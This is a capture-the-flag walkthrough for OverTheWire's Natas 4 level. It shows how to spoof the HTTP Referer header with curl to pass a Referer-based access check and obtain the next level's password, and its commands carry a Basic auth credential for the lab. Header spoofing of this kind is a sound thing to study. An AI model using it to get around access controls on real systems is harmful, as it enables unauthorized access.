# 🔐 Natas 4 Walkthrough

To complete **Natas 4** of the OverTheWire wargames, we need to understand how **HTTP Referers** work.  
This particular level restricts access based on the `Referer` header — it must appear as though we're coming from **natas5**, even though we don't have direct access to that level yet.

---

## 🧠 The Clue

When you visit the site and refresh the page, you'll see:

> **Access disallowed. You are visiting from ...natas4... while authorized users should come only from ...natas5...**

This means our current request is coming from the wrong source (natas4), and we need to spoof or change the `Referer` to make it seem like we’re coming from **natas5**.

---

## 🛠️  Step-by-Step: Modifying the Referer with `curl`

We'll solve this using `curl` in the terminal by customizing the HTTP headers.

### 1. Open Developer Tools

In your browser:

- Press `F12` or right-click → **Inspect**
- Go to the **Network** tab
- Refresh the page

You’ll see a request to `index.php`.

---

### 2. Copy the Request as `curl`

Right-click the `index.php` request and choose:

> **Copy → Copy as cURL**

You’ll get something like:

```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' 
--compressed   
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0'   
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   
-H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3'   
-H 'Accept-Encoding: gzip, deflate'   
-H 'Referer: http://natas4.natas.labs.overthewire.org/index.php'   
-H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR'   
-H 'Connection: keep-alive'   
-H 'Upgrade-Insecure-Requests: 1'   
-H 'DNT: 1'   
-H 'Sec-GPC: 1'   
-H 'Priority: u=0, i'
```
---

### 3. Change the Referer to point to natas5

All you have to do is modify the Referer header. Change:

```bash
-H 'Referer: http://natas4.natas.labs.overthewire.org/index.php'
```
To:

```bash
-H 'Referer: http://natas5.natas.labs.overthewire.org'
```

>Be sure to remove /index.php - it must be the root path of natas5.

---

### 4. Final command

Here's the full, working command:

```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
--compressed \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Referer: http://natas5.natas.labs.overthewire.org' \
-H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'DNT: 1' \
-H 'Sec-GPC: 1'
```

The output should grant you the password to natas5.
